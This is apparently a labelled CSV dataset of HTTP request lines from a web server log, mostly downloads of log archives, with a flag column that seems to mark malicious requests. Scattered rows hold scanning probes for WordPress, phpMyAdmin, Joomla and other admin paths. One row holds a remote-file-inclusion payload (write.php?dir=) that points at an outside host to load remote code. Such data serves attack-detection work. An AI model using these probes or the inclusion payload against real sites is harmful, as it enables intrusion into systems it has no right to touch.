48,1,200,0,GET /self.logs/access.log.2016-10-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-10.gz HTTP/1.1
31,1,404,1,GET /honeypot/Honeypot HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-21.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-11-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-28.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/weird.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-28.gz HTTP/1.1
40,1,200,1,GET /honeypot/honeypot.json.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-12.gz HTTP/1.1
48,1,404,0,GET /templets/default/style/dedecms.css HTTP/1.1
38,1,404,0,GET /access.log.2015-02-12.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-10-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-19.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-14.gz HTTP/1.1
23,1,200,0,GET /?author=1 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-20.gz HTTP/1.1
41,1,404,1,GET /honeypot/Honeypot-Howto.pdf HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-20.gz HTTP/1.1
115,1,404,1,GET /honeypot//write.php?dir=http://www.ostinato.be//components/com_avreloaded/views/popup/tmpl/rfix.txt?? HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-24.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-06.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-09-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-30.gz HTTP/1.1
27,1,404,0,GET /dcdbforum.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-12.gz HTTP/1.1
38,1,404,0,GET //wp-admin/admin-ajax.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-28.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/ssh.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-06.gz HTTP/1.1
22,1,206,0,GET /#contact HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-16.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-11-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-10.gz HTTP/1.1
36,1,200,1,GET /self.logs/?C=M%3BO%3DA HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-10.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-02-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-07.gz HTTP/1.1
52,1,404,1,GET /honeypot/_phpmyadmin/scripts/setup.php HTTP/1.1
49,1,200,0,GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-24.gz HTTP/1.1
64,1,404,1,GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-01.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=D;O=D HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-12.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-12-29.gz HTTP/1.1
53,1,404,1,GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-05.gz HTTP/1.1
37,1,404,0,GET /administrator/index.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-20.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-15.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-04-31.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-06-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-05.gz HTTP/1.1
38,1,404,0,GET /member/images/member.gif HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-23.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-12-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-27.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=A HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-29.gz HTTP/1.1
27,1,301,0,GET /bitrix/admin/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-28.gz HTTP/1.1
22,1,200,0,GET /tg/a.zip HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-12.gz HTTP/1.1
28,1,301,0,GET /blog/wp-admin/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-19.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-29.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-22.gz HTTP/1.1
31,1,404,0,GET /pe_static/ap1.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-04.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=S;O=D HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-05.gz HTTP/1.1
23,1,404,0,GET //mide.php HTTP/1.0
41,1,404,0,GET /dede/img/admin_top_logo.gif HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-06.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-03-13.gz HTTP/1.1
93,1,404,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf//write.php?dir=remote?? HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-10.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-11-14.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-06-31.gz HTTP/1.1
